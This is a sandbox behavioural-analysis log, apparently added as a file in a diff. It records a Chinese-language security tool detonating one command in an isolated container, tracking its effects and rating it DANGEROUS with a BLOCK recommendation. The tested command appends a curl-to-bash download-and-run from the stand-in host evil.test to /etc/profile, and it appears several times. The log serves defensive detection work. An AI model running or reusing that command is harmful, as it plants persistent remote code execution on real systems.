@@ -1,0 +1,348 @@
+
+[1m==========================================
+  OpenSandbox Behavioral Analysis Engine v4
+==========================================[0m
+
+[0;36m[INFO][0m  待检测命令: echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile
+
+[0;36m[INFO][0m  [Step 1/7] 检查环境...
+[0;32m[ OK ][0m Docker: Docker version 27.5.1, build 27.5.1-0ubuntu3~24.04.2
+[0;32m[ OK ][0m Python: Python 3.12.3
+[0;36m[INFO][0m  安装 uv...
+downloading uv 0.10.12 x86_64-unknown-linux-gnu
+no checksums to verify
+installing to /root/.local/bin
+  uv
+  uvx
+everything's installed!
+[0;32m[ OK ][0m uv: uv 0.10.12 (x86_64-unknown-linux-gnu)
+[0;36m[INFO][0m  [Step 2/7] 预拉取 Docker 镜像...
+[0;32m[ OK ][0m 沙箱镜像: opensandbox/code-interpreter:v1.0.2 (已存在)
+[0;32m[ OK ][0m Execd镜像: opensandbox/execd:v1.0.7 (已存在)
+[0;36m[INFO][0m  [Step 3/7] 安装 Python 依赖...
+[0;32m[ OK ][0m opensandbox-server + SDK 已安装
+[0;36m[INFO][0m  [Step 4/7] 生成服务端配置...
+[0;32m[ OK ][0m 配置写入: /tmp/tmp.Y7oaTPm6fE/sandbox.toml
+[0;36m[INFO][0m  [Step 5/7] 启动 OpenSandbox Server...
+[0;32m[ OK ][0m Server 就绪 (PID: 700337, port: 8080)
+[0;36m[INFO][0m  [Step 6/7] 创建沙箱并执行深度行为分析...
+
+/tmp/tmp.Y7oaTPm6fE/checker.py:803: SyntaxWarning: invalid escape sequence '\$'
+  "echo '=== cron.d ==='; for f in /etc/cron.d/*; do [ -f \"\$f\" ] && echo \"--- \$f ---\" && cat \"\$f\"; done 2>/dev/null || true; "
+
+============================================================================
+  1/9  创建隔离沙箱
+============================================================================
+  镜像: opensandbox/code-interpreter:v1.0.2
+  Sandbox ID: 906a90db-9b5b-472a-8591-2cf9f53cfa3b
+
+============================================================================
+  2/9  安装监控工具 (快照前, 避免污染基线)
+============================================================================
+  监控工具已安装
+
+============================================================================
+  3/9  采集执行前基线 (24 维度)
+============================================================================
+  文件数       : 221689
+  SUID/SGID    : 14
+  符号链接     : 483
+  文件能力     : 1
+  基线采集耗时 : 15.4s
+  CPU          : 4.0%
+  Memory       : 1850.1/15069.3 MiB
+
+============================================================================
+  4/9  启动多层探针 + 执行待测命令
+============================================================================
+  [探针1] inotify: /usr/local/bin /usr/bin /usr/sbin /etc /root /home
+  [探针2] inotify: /tmp /var/tmp /dev/shm (独立探针)
+  [探针3] network: /proc/net/tcp 轮询 (0.5s)
+  [探针5] process: 进程树轮询 (1s)
+
+  --- 命令链分解分析 ---
+    单阶段命令
+
+  --- 命令去混淆分析 ---
+    PASS  未发现编码/混淆层
+
+  --- 命令静态分析 ---
+    !! [T1105] download and execute (curl|sh) (score: 25)
+
+  $ echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile
+  ────────────────────────────────────────────────────────────
+
+  耗时     : 1.0s
+  退出码   : 0
+  stdout   : 0 行
+  stderr   : 0 行
+
+============================================================================
+  5/9  采集执行后快照 (全维度)
+============================================================================
+  文件数       : 221689
+  SUID/SGID    : 14
+  inotify 系统 : 1 条
+  inotify /tmp : 205373 条
+
+============================================================================
+  6/9  网络行为深度分析
+============================================================================
+
+  --- 外部连接 (出站) ---
+    (无外部连接)
+
+    [20 个内部连接已忽略]
+
+  --- DNS 配置 ---
+    PASS  /etc/resolv.conf 未被修改
+
+============================================================================
+  7/9  全维度安全对比分析 (24 维度)
+============================================================================
+
+  --- [D1] 文件变更 (+1 / -1) ---
+    新增 1 个:
+      + /etc/profile
+    删除 1 个:
+      - /etc/profile
+    !! 敏感路径写入: ['/etc/profile']
+
+  --- [D2] 实时文件事件 (inotifywait) ---
+    系统目录事件 (1 条):
+      2026-03-20T04:03:48 MODIFY /etc/profile
+    临时目录事件 (5461 条):
+      2026-03-20T04:03:54 CREATE /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+      2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX
+
+  --- [D3] 用户与权限 ---
+    PASS  /etc/passwd, shadow, sudoers, SSH, PAM 无变化
+
+  --- [D4] 持久化 (cron/systemd/rc.local/init.d/at) ---
+    PASS  无新增
+
+  --- [D5] Shell 环境 (.bashrc/.profile/etc) ---
+    !! FAIL  Shell 配置被修改
+      0a1,3
+      > # ~/.bashrc: executed by bash(1) for non-login shells.
+      > # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+      > # for examples
+      1a5,112
+      > # If not running interactively, don't do anything
+      > [ -z "$PS1" ] && return
+      > 
+      > # don't put duplicate lines in the history. See bash(1) for more options
+      > # ... or force ignoredups and ignorespace
+      > HISTCONTROL=ignoredups:ignorespace
+      > 
+      > # append to the history file, don't overwrite it
+      > shopt -s histappend
+      > 
+
+  --- [D6] 进程树分析 ---
+    观察到 17 个独立进程:
+      > /opt/opensandbox/execd
+      > COMMAND
+      > \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf
+      > \_ bash -c find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null | sort
+      > \_ bash -c find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} \; 2>/dev/null | sort || true
+      > \_ bash -c getcap -r / 2>/dev/null | sort || true
+      > \_ cat /proc/net/tcp /proc/net/tcp6
+      > \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
+      > \_ find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} ;
+      > \_ getcap -r /
+      > \_ sort
+      > tail -f /dev/null
+      > |   \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
+      > |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
+      > |   \_ getcap -r /
+      > |   \_ ls -la /etc/alternatives/lzcmp
+      > |   \_ sort
+
+    残留进程 (执行后):
+      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+      root           1  0.0  0.0   3156  1792 ?        Ss   04:03   0:00 tail -f /dev/null
+      root           7 18.6  0.1 1244480 21556 ?       Sl   04:03   0:06 /opt/opensandbox/execd
+      root         837  0.0  0.0   4752  3584 ?        S    04:03   0:00  \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf '%s %T@ %p\n' 2>/dev/null | sort
+      root         839  0.0  0.0   4084  2560 ?        R    04:03   0:00  |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
+      root         840  0.0  0.0  24904  3200 ?        S    04:03   0:00  |   \_ sort
+      root         838  0.0  0.0   4752  3584 ?        S    04:03   0:00  \_ bash -c ps auxf 2>/dev/null || ps aux
+      root         841  0.0  0.0   8280  4224 ?        R    04:03   0:00  |   \_ ps auxf
+      root         842  0.0  0.0   4752  3712 ?        S    04:03   0:00  \_ bash -c cat ~/.bashrc ~/.bash_profile ~/.profile ~/.bash_logout /etc/profile /etc/bash.bashrc /etc/environment /etc/profile.d/*.sh 2>/dev/null | md5sum
+
+  --- [D7] 残留网络连接 ---
+        sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+         0: 0100007F:AABC 0100007F:AEE4 01 00000000:00000000 02:00000068 00000000     0        0 4468117 2 0000000000000000 20 4 30 10 -1                  
+         1: 0100007F:C23C 0100007F:AEE4 01 00000000:00000000 02:000004AD 00000000     0        0 4473195 2 0000000000000000 20 4 30 10 -1                  
+         2: 0100007F:9E2C 0100007F:AEE4 01 00000000:00000000 02:00000557 00000000     0        0 4469795 2 0000000000000000 20 4 30 10 -1                  
+         3: 0100007F:C236 0100007F:AEE4 01 00000000:00000000 02:00000448 00000000     0        0 4473926 2 0000000000000000 20 4 30 10 -1                  
+         4: 0100007F:9E24 0100007F:AEE4 01 00000000:00000000 02:00000357 00000000     0        0 4469794 2 0000000000000000 20 4 0 10 -1                   
+         5: 0100007F:AA52 0100007F:AEE4 01 00000000:00000000 02:00000514 00000000     0        0 4480885 2 0000000000000000 20 4 30 10 -1                  
+         6: 0100007F:AAAA 0100007F:AEE4 01 00000000:00000000 02:00000067 00000000     0        0 4468109 2 0000000000000000 20 4 30 10 -1                  
+         7: 0100007F:9DE4 0100007F:AEE4 01 00000000:00000000 02:00000231 00000000     0        0 4466271 2 0000000000000000 20 4 30 10 -1                  
+         8: 0100007F:817A 0100007F:AEE4 01 00000000:00000000 02:000007BD 00000000     0        0 4481723 2 0000000000000000 20 4 30 10 -1                  
+         9: 0100007F:9DE8 0100007F:AEE4 01 00000000:00000000 02:000004F1 00000000     0        0 4465389 2 0000000000000000 20 4 30 10 -1                  
+        10: 0100007F:AAAC 0100007F:AEE4 01 00000000:00000000 02:00000068 00000000     0        0 4468115 2 0000000000000000 20 4 30 10 -1                  
+        11: 0100007F:AAB0 0100007F:AEE4 01 00000000:00000000 02:00000068 00000000     0        0 4471785 2 0000000000000000 20 8 2 10 -1                   
+        12: 0100007F:818C 0100007F:AEE4 01 00000000:00000000 02:00000A0D 00000000     0        0 4487339 2 0000000000000000 20 4 30 10 -1                  
+        13: 0100007F:9DCA 0100007F:AEE4 01 00000000:00000000 02:00000231 00000000     0        0 4466262 2 0000000000000000 20 4 30 10 -1                  
+
+  --- [D8] 资源消耗 ---
+    CPU    : 4.0% -> 2.8% (Δ -1.3%)
+    Memory : 1850.1 -> 1853.9 MiB (Δ +3.9 MiB)
+
+  --- [D9] 可疑二进制 (/tmp /var/tmp /dev/shm) ---
+    PASS
+
+  --- [D10] SUID/SGID 文件变更 ---
+    PASS  无新增 SUID/SGID 文件
+
+  --- [D11] 内核模块 ---
+    PASS  无变化
+
+  --- [D12] 挂载点 ---
+    PASS  无变化
+
+  --- [D13] 安全相关环境变量 ---
+    PASS  无变化
+
+  --- [D14] 关键文件内容分析 ---
+    !! [T1105] download and execute (curl|sh)
+
+  --- [D15] 关键系统二进制完整性 ---
+    PASS  /bin/bash, su, sudo, passwd, sshd 等均未被篡改
+
+  --- [D16] 符号链接变更 ---
+    PASS  无新增符号链接
+
+  --- [D17] 文件能力 (Linux Capabilities) ---
+    PASS  无新增文件能力
+
+  --- [D18] 输出内容分析 ---
+    PASS  输出内容无敏感信息泄露
+
+  --- [D19] 新增文件熵分析 ---
+    PASS  无异常高熵文件
+
+  --- [D20] 计划任务详细差异 ---
+    PASS  计划任务无变化
+
+  --- [D21] 隐藏进程检测 ---
+    PASS  未发现隐藏进程
+
+  --- [D22] 信号处理 / trap 分析 ---
+    PASS  未发现恶意信号处理
+
+  --- [D23] 攻击链关联分析 ---
+    PASS  未检测到攻击链组合
+
+  --- [D24] 敏感文件权限变更 ---
+    PASS  敏感文件权限正常
+
+============================================================================
+  8/9  MITRE ATT&CK 技术映射
+============================================================================
+    [T1105] Ingress Tool Transfer
+      └─ 命令匹配恶意模式: download and execute (curl|sh)
+      └─ Shell 配置含恶意内容: download and execute (curl|sh)
+    [T1222.002] File/Dir Permissions Modification: Linux
+      └─ 敏感路径写入: ['/etc/profile']
+    [T1546.004] Event Triggered Execution: .bash_profile/.bashrc
+      └─ Shell 配置文件被修改
+
+============================================================================
+  9/9  综合判定
+============================================================================
+
+  +──────────────────────────────────────────────────────────────────────────+
+  |  [!!] 判定: DANGEROUS             风险评分: 100/100            |
+  |  [████████████████████████████████████████]                              |
+  |  置信度: HIGH    维度覆盖:  4/24              |
+  +──────────────────────────────────────────────────────────────────────────+
+
+  命令           : echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile
+  合法命令模式   : 否
+  退出码         : 0
+  文件 +/-       : +1 / -1
+  inotify 事件   : 1 系统 + 5461 临时
+  外部连接       : 0 个
+  SUID/SGID 变更 : +0
+  二进制完整性   : PASS
+  新增符号链接   : 0
+  新增文件能力   : 0
+  执行耗时       : 1.0s
+  MITRE 技术     : 3 个
+  ATT&CK 战术    : Command and Control, Persistence, Unknown
+  发现           : 2 critical, 2 warnings, 0 info
+  置信度         : HIGH
+
+  详细发现 (按严重程度排序):
+    [!!!] [文件变更] 敏感路径写入: ['/etc/profile'] [T1222.002] (score: 35)
+    [!!!] [内容分析] Shell 配置含恶意内容: download and execute (curl|sh) [T1105] (score: 25)
+    [ ! ] [静态分析] 命令匹配恶意模式: download and execute (curl|sh) [T1105] (score: 25)
+    [ ! ] [Shell环境] Shell 配置文件被修改 [T1546.004] (score: 20)
+
+  安全建议:
+    -> BLOCK: 强烈建议阻止此命令执行
+
+  报告 (JSON) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979470.json
+  报告 (文本) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979470.txt
+  报告 (SARIF): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979470.sarif.json
+
+  快速预判: BLOCK (静态分: 25, 模式匹配: 1)
+
+============================================================================
+  人类可读摘要:
+============================================================================
+  🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)
+  命令: echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile
+  
+  发现 4 个问题 (2 严重, 2 警告):
+    [CRITICAL] 文件变更: 敏感路径写入: ['/etc/profile'] [T1222.002]
+    [CRITICAL] 内容分析: Shell 配置含恶意内容: download and execute (curl|sh) [T1105]
+    [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]
+    [WARN] Shell环境: Shell 配置文件被修改 [T1546.004]
+  
+  涉及 ATT&CK 战术: Command and Control, Persistence, Unknown
+  
+  建议:
+    • BLOCK: 强烈建议阻止此命令执行
+
+  沙箱已销毁。
+
+
+[0;36m[INFO][0m  [Step 7/7] 完成!
+[0;32m[ OK ][0m 报告 (JSON): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979470.sarif.json
+  查看: python3 -m json.tool /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979470.sarif.json
+  快速预判: FAST_TRIAGE=1 COMMAND='...' ./checker.sh
+
+[0;36m[INFO][0m  Cleaning up...
+[0;32m[ OK ][0m Cleanup done.
